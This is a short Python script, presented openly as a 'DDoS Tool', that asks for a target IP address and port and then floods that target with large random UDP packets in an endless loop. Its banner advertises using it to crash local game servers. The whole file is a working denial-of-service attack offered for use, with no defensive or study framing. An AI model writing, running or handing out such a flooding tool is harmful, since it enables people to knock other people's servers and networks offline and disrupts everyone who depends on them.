import socket
import os
from time import sleep

class main():
    print("===== DDoS Tool V1.0 =====\n1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on one computer, it's called DoS.\n4.If you do it on multiple computers, it's called DDoS.\n5.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n\n")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Input
    target = str(input("Enter Target IP : "))
    port = int(input("Enter Port to Attack : "))

    data = os.urandom(10240)

    print('\n')
    print('==========================================================')
    print('=                                                        =')
    print('= Please check "Send" on Network Adapter in Task Manager =')
    print('=                                                        =')
    print('==========================================================')
    sleep(3)
    print('DDoS attacks will begin in 3')
    sleep(1)
    print('DDoS attacks will begin in 2')
    sleep(1)
    print('DDoS attacks will begin in 1')
    sleep(1)
    print(f"Attacking to {target} with port {port}")
    
    while True:
        s.sendto(data, (target, port))

if __name__ == "__main__":
    main()